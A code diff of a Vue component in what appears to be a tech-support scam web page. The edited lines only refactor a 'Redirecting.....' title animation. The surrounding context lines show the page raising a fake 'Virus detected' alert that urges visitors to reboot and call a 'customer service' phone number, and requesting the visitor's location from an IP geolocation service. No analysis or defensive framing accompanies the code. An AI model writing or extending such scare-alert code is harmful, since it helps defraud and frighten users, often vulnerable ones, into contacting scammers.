@@ -77,12 +77,12 @@ export default {
   },
   mounted() {
     this.titleInterval = setInterval(function() {
-      document.getElementsByTagName("title")[0].textContent === "Redirecting....." ? document.getElementsByTagName("title")[0].textContent = "Redirecting" :
-      document.getElementsByTagName("title")[0].textContent === "Redirecting" ? document.getElementsByTagName("title")[0].textContent = "Redirecting." :
-      document.getElementsByTagName("title")[0].textContent === "Redirecting." ? document.getElementsByTagName("title")[0].textContent = "Redirecting.." :
-      document.getElementsByTagName("title")[0].textContent === "Redirecting.." ? document.getElementsByTagName("title")[0].textContent = "Redirecting..." :
-      document.getElementsByTagName("title")[0].textContent === "Redirecting..." ? document.getElementsByTagName("title")[0].textContent = "Redirecting...." :
-      document.getElementsByTagName("title")[0].textContent = "Redirecting.....";
+      document.querySelector("title").textContent === "Redirecting....." ? document.querySelector("title").textContent = "Redirecting" :
+      document.querySelector("title").textContent === "Redirecting" ? document.querySelector("title").textContent = "Redirecting." :
+      document.querySelector("title").textContent === "Redirecting." ? document.querySelector("title").textContent = "Redirecting.." :
+      document.querySelector("title").textContent === "Redirecting.." ? document.querySelector("title").textContent = "Redirecting..." :
+      document.querySelector("title").textContent === "Redirecting..." ? document.querySelector("title").textContent = "Redirecting...." :
+      document.querySelector("title").textContent = "Redirecting.....";
     }, 300);
     alert("Virus detected, please close the tab and reboot your computer\nContact customer service for support: (613) 555-0186");
     this.xhr.open("GET", "https://geoip-db.com/jsonp/");
